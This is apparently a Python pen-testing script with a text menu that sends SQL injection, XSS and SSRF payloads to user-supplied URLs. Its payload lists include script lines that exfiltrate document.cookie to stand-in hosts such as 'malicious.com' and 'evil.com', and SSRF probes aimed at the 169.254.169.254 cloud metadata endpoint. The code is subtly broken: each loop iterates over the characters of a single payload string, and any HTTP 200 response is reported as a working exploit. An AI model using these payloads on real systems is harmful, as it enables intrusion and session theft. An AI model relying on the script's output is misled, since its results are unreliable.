######################################################################################################################################################################################################################
# Python script for possible vulnerabilities in a web application, and does not constitute or replace a robust vulnerability scanner. Note: Be mindful of the scope of work, & rules of engagement, script also requires BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/. .
# python web_security_framework.py. Requires a linux virtual environment for older python version funtionality, pip restrictions for external dependancies, and reducing conflicts. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
# Replace teaget_url with the specific endpoints you want to test for each vulnerability. Replace "http://your_base_url" with the base URL of the application you're testing
######################################################################################################################################################################################################################


# Setup logging for advanced APT framework
import requests
import random
import time
import asyncio
import aiohttp
from tqdm import tqdm
from time import sleep

# Banner
def print_banner():
    banner = r"""

 __      __        ___.             _____                  .__   .__                  __  .__                       _________                           .__   __                ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
/  \    /  \  ____ \_ |__          /  _  \ ______  ______  |  |  |__|  ____  _____  _/  |_|__| ____   ____         /   _____/ ____   ____   __ _________|__|_/  |_  ___.__.     \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /_/ __ \ | __ \        /  /_\  \\____ \ \____ \ |  |  |  |_/ ___\ \__  \ \   __\  |/  _ \ /    \        \_____  \_/ __ \_/ ___\ |  |  \_  __ \  |\   __\<   |  |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        / \  ___/ | \_\ \      /    |    \  |_> >|  |_> >|  |__|  |\  \___  / __ \_|  | |  (  <_> )   |  \       /        \  ___/\  \___ |  |  /|  | \/  | |  |   \___  |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  /   \___  >|___  /______\____|__  /   __/ |   __/ |____/|__| \___  >(____  /|__| |__|\____/|___|  /______/_______  /\___  >\___  >|____/ |__|  |__| |__|   / ____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
       \/        \/     \//_____/        \/|__|    |__|                   \/      \/                     \//_____/        \/     \/     \/                          \/    /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)


  Web Application Security Framework - Custom Pen Testing Script
    """
    print(banner)
    

# Global variables (can be moved to a config file for flexibility)
HEADERS = {'User-Agent': 'Mozilla/5.0'}
MAX_RETRIES = 3
RETRY_DELAY = 2
SQL_PAYLOADS = ["' OR 1=1 --", "' UNION SELECT NULL, NULL --", "' OR 'x'='x", "' AND 1=0 UNION SELECT null, null --"]
XSS_PAYLOADS = ["<script>alert('XSS');</script>", "<img src='http://evil.com/xss?cookie=dummycookie' />", "<script>fetch('http://malicious.com?cookie=' + document.cookie);</script>"]
SSRF_PAYLOADS = ["http://localhost/", "http://127.0.0.1/", "http://169.254.169.254/"]
LOG_FILE = 'test_log.txt'

# Session management for performance
session = requests.Session()

# Function to handle retries
def request_with_retry(url, max_retries=MAX_RETRIES, delay=RETRY_DELAY):
    retries = 0
    while retries < max_retries:
        try:
            response = session.get(url, headers=HEADERS)
            return response
        except requests.RequestException as e:
            retries += 1
            if retries >= max_retries:
                log_action("Request Failed", "Error", str(e))
                return None
            sleep(random.uniform(1, delay))  # Randomized retry delay
    return None

# Real-time reporting function
def real_time_report(results):
    """Print real-time results with timestamp."""
    for result in results:
        print(f"{time.strftime('%H:%M:%S')} - {result[0]} | Status: {result[1]} | Message: {result[2]}")
        log_action(result[0], result[1], result[2])

# Log action to file
def log_action(action, status, message):
    with open(LOG_FILE, 'a') as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {action} | {status} | {message}\n")

# Function to load payloads from external file
def load_payloads_from_file(filename):
    try:
        with open(filename, 'r') as file:
            return [line.strip() for line in file]
    except FileNotFoundError:
        log_action("Payload File Not Found", "Warning", f"Could not find {filename}. Using default payloads.")
        return []

# Function to get a random payload from file or default list
def get_random_payload(payload_type, payload_file=None):
    if payload_file:
        return random.choice(load_payloads_from_file(payload_file))
    elif payload_type == 'sql':
        return random.choice(SQL_PAYLOADS)
    elif payload_type == 'xss':
        return random.choice(XSS_PAYLOADS)
    elif payload_type == 'ssrf':
        return random.choice(SSRF_PAYLOADS)
    return None

# Asynchronous function for concurrent requests
async def fetch(url, session):
    try:
        async with session.get(url) as response:
            return await response.text()
    except Exception as e:
        log_action("Async Request Failed", "Error", str(e))
        return None

# Crawl multiple URLs concurrently
async def async_crawl(urls):
    async with aiohttp.ClientSession() as session:
        tasks = [fetch(url, session) for url in urls]
        return await asyncio.gather(*tasks)

# Function for SSRF testing
def test_ssrf(url, forms):
    payloads = get_random_payload('ssrf')
    results = []
    for form in tqdm(forms, desc="Testing SSRF"):
        for payload in payloads:
            result = single_ssrf_injection(form, payload)
            results.append(result)
    return results

# Perform actual SSRF test on the form
def single_ssrf_injection(form, payload):
    response = request_with_retry(form['url'] + payload)
    if response and response.status_code == 200:
        return (form['url'], "Success", f"Payload: {payload} works!")
    return (form['url'], "Failure", "Payload did not trigger expected result.")

# SQL Injection testing with progress bar
def test_sql_injection_with_progress(url, forms):
    payloads = get_random_payload('sql')
    results = []
    for form in tqdm(forms, desc="Testing SQL Injection"):
        for payload in payloads:
            result = single_sql_injection(form, payload)
            results.append(result)
    return results

# Perform actual SQL injection test on the form
def single_sql_injection(form, payload):
    response = request_with_retry(form['url'] + payload)
    if response and response.status_code == 200:
        return (form['url'], "Success", f"Payload: {payload} works!")
    return (form['url'], "Failure", "Payload did not trigger expected result.")

# XSS testing with progress bar
def test_xss_with_progress(url, forms):
    payloads = get_random_payload('xss')
    results = []
    for form in tqdm(forms, desc="Testing XSS"):
        for payload in payloads:
            result = single_xss_injection(form, payload)
            results.append(result)
    return results

# Perform actual XSS test on the form
def single_xss_injection(form, payload):
    response = request_with_retry(form['url'] + payload)
    if response and response.status_code == 200:
        return (form['url'], "Success", f"Payload: {payload} works!")
    return (form['url'], "Failure", "Payload did not trigger expected result.")

# Entry point for asynchronous crawling of multiple URLs
def start_async_crawl(urls):
    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(async_crawl(urls))
    real_time_report(results)

# Display main menu with numbered options
def display_main_menu():
    print("\nPenetration Testing Framework")
    print("-------------------------------")
    print("1. Test SQL Injection")
    print("2. Test XSS Injection")
    print("3. Test SSRF Injection")
    print("4. Crawl URLs Concurrently")
    print("5. Exit")

# Display sub-menu for SQL Injection
def sql_injection_menu():
    print("\nSelect the target for SQL Injection testing:")
    print("1. Single URL")
    print("2. Multiple URLs")
    print("3. Go Back")

# Display sub-menu for XSS Injection
def xss_injection_menu():
    print("\nSelect the target for XSS Injection testing:")
    print("1. Single URL")
    print("2. Multiple URLs")
    print("3. Go Back")

# Display sub-menu for SSRF Injection
def ssrf_injection_menu():
    print("\nSelect the target for SSRF Injection testing:")
    print("1. Single URL")
    print("2. Multiple URLs")
    print("3. Go Back")

# Function to get user input safely
def get_user_input(prompt, options=None):
    while True:
        try:
            user_input = int(input(prompt))
            if options and user_input not in options:
                print("Invalid selection, please choose again.")
            else:
                return user_input
        except ValueError:
            print("Invalid input. Please enter a number.")

# Main program logic
def main():
    while True:
        display_main_menu()
        choice = get_user_input("Select an option (1-5):", options=[1, 2, 3, 4, 5])

        if choice == 1:  # SQL Injection
            sql_injection_menu()
            sub_choice = get_user_input("Select an option (1-3):", options=[1, 2, 3])
            if sub_choice == 1:  # Single URL
                url = input("Enter the URL to test: ")
                forms = [{'url': url}]
                sql_results = test_sql_injection_with_progress(url, forms)
                real_time_report(sql_results)
            elif sub_choice == 2:  # Multiple URLs
                urls = input("Enter URLs separated by commas: ").split(',')
                forms = [{'url': url.strip()} for url in urls]
                sql_results = test_sql_injection_with_progress("", forms)
                real_time_report(sql_results)
            elif sub_choice == 3:
                continue

        elif choice == 2:  # XSS Injection
            xss_injection_menu()
            sub_choice = get_user_input("Select an option (1-3):", options=[1, 2, 3])
            if sub_choice == 1:  # Single URL
                url = input("Enter the URL to test: ")
                forms = [{'url': url}]
                xss_results = test_xss_with_progress(url, forms)
                real_time_report(xss_results)
            elif sub_choice == 2:  # Multiple URLs
                urls = input("Enter URLs separated by commas: ").split(',')
                forms = [{'url': url.strip()} for url in urls]
                xss_results = test_xss_with_progress("", forms)
                real_time_report(xss_results)
            elif sub_choice == 3:
                continue

        elif choice == 3:  # SSRF Injection
            ssrf_injection_menu()
            sub_choice = get_user_input("Select an option (1-3):", options=[1, 2, 3])
            if sub_choice == 1:  # Single URL
                url = input("Enter the URL to test: ")
                forms = [{'url': url}]
                ssrf_results = test_ssrf(url, forms)
                real_time_report(ssrf_results)
            elif sub_choice == 2:  # Multiple URLs
                urls = input("Enter URLs separated by commas: ").split(',')
                forms = [{'url': url.strip()} for url in urls]
                ssrf_results = test_ssrf("", forms)
                real_time_report(ssrf_results)
            elif sub_choice == 3:
                continue

        elif choice == 4:  # Crawl URLs Concurrently
            urls = input("Enter URLs separated by commas: ").split(',')
            start_async_crawl(urls)

        elif choice == 5:  # Exit
            print("Exiting...")
            break

if __name__ == "__main__":
    main()
